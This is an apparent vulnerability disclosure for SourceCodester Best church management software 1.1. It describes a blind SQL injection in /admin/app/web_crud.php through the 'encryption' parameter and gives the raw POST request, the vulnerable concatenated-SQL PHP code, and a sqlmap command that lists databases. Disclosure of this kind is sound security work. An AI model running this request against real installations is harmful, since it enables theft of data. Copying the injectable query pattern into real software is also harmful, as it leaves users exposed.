# Code Source
https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
# Description
A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in `/admin/app/web_crud.php`. Affected is file `/admin/app/web_crud.php`,The manipulation of the argument encryption leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.

# Request
```
POST /admin/app/web_crud.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

update3=1&encryption=*
```

# Affect code(`/admin/app/web_crud.php`)
```
......
if (isset($_POST['update3'])) {

    $stmt = $conn->prepare("UPDATE `emailsetting` SET `encryption`='" . $_POST['encryption'] . "',`host`='" . $_POST['host'] . "',`port`='" . $_POST['port'] . "',`username`='" . $_POST['username'] . "',`password`='" . $_POST['password'] . "',`email`='" . $_POST['email'] . "' WHERE id='" . $_POST['id'] . "' ");

    $stmt->execute();

    $_SESSION['update'] = "update";
    header("location:../web.php");
}
......
```

# Exploit
```
python sqlmap.py -r .\1.txt --dbs
```
![图片](https://github.com/user-attachments/assets/6c7e9e42-a2ac-4058-b338-8b82fd03bc3d)

![图片](https://github.com/user-attachments/assets/0b7655ed-8240-424a-ab9b-821ed2bf25e9)

